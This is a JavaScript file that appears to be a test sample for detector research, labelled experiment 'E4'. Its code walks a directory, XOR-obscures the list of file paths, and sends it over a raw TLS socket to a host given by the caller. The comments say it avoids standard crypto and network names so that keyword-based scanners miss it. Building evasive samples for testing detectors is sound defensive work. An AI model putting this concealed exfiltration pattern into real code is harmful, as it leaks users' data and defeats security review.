'use strict';
// E4 ★ 最有价值的实验：非标准加密 + 明确的结构关系。
//
// 目的：lexical 完全看不见时，structural 能否补上？
//
//   obscureSeal(data) → { sealedBlob, sealedSize }
//                              ↓ 同一对象字面量内引用
//   shipSealed({ payload: sealed.sealedBlob, bytes: sealed.sealedSize })
//
// 全流程不使用 createCipheriv / fetch / https.request / archiver 等标准名。
const nfs = require('fs');

// ---- 非标准"加密"（名字与调用都不含标准术语）----
function obscureSeal(plain) {
  const salt = nfs.readFileSync('/dev/urandom', { length: 16 }) || Buffer.alloc(16, 7);
  const out = Buffer.alloc(plain.length + 2);
  out[0] = plain.length & 0xff;
  for (let i = 0; i < plain.length; i++) out[i + 1] = plain[i] ^ salt[i % salt.length];
  out[out.length - 1] = 0x9c;
  return { sealedBlob: out, sealedSize: out.length, algo: 'obscure-v1' };
}

// ---- 非标准"发出"----
function shipSealed(pkg) {
  const link = require('tls').connect({ host: pkg.apex, port: 443 });
  link.on('secureConnect', () => { link.write(pkg.payload); link.end(); });
}

// ---- 调用点：结构关系在**同一对象字面量**内成立 ----
async function run(root, apex) {
  const files = [];
  (function walk(d) {
    for (const e of nfs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else files.push(p);
    }
  })(root);

  const sealed = obscureSeal(Buffer.from(files.join('\n')));

  // ★ 关键：sealed 的字段被直接搬进发出函数的参数对象
  return shipSealed({
    apex: apex,
    payload: sealed.sealedBlob,
    bytes: sealed.sealedSize,
    meta: sealed.algo,
  });
}

module.exports = { run, obscureSeal, shipSealed };
